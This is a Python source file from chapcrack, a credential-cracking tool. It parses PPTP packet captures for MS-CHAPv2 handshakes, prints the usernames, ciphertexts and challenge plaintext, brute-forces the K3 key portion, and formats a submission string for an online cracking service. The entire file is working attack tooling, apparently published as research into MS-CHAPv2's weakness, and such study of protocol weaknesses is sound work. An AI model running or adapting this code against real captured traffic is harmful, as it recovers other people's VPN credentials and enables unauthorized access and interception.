"""
The parse command.  Accepts a pcap file containing a PPTP capture.

Parses a packet capture for CHAPv2 handshakes, and prints details
of the handshake necessary for cracking.  These include the client
and server IP addresses, the username, and the plaintext/ciphertext
pairs.
"""
import base64
import sys

from chapcrack.commands.Command import Command
from chapcrack.crypto.K3Cracker import K3Cracker
from chapcrack.readers.ChapPacketReader import ChapPacketReader
from chapcrack.state.MultiChapStateManager import MultiChapStateManager

__author__    = "Moxie Marlinspike"
__license__   = "GPLv3"
__copyright__ = "Copyright 2012, Moxie Marlinspike"

class ParseCommand(Command):

    def __init__(self, argv):
        Command.__init__(self, argv, "i", "n")

    def printHelp(self):
        print(
            """Parses a PPTP capture and prints the ciphertext/plaintext pairs for decrypting.

              parse

            Arguments:
              -i <input> : The capture file
              -n         : If specified, doesn't crack K3
            """)

    def execute(self):
        inputFile  = self._getInputFile()
        handshakes = MultiChapStateManager()
        capture    = open(inputFile)
        reader     = ChapPacketReader(capture)

        for packet in reader:
            handshakes.addHandshakePacket(packet)

        complete = handshakes.getCompletedHandshakes()

        for server in complete:
            for client in complete[server]:
                print "Got completed handshake [%s --> %s]" % (client, server)

                c1, c2, c3 = complete[server][client].getCiphertext()
                plaintext  = complete[server][client].getPlaintext()
                username   = complete[server][client].getUserName()
                k3         = self._getK3(plaintext, c3)

                print "                   User = %s" % username
                print "                     C1 = %s" % c1.encode("hex")
                print "                     C2 = %s" % c2.encode("hex")
                print "                     C3 = %s" % c3.encode("hex")
                print "                      P = %s" % plaintext.encode("hex")

                if k3 is not None:
                    print "                     K3 = %s" % k3.encode("hex")
                    print "CloudCracker Submission = %s" % base64.b64encode("%s%s%s%s" % (plaintext, c1, c2, k3))

    def _getK3(self, plaintext, ciphertext):
        if not self._containsOption("-n"):
            sys.stdout.write("Cracking K3...")
            k3 = K3Cracker().crack(plaintext, ciphertext, True)
            print ""

            return k3

        return None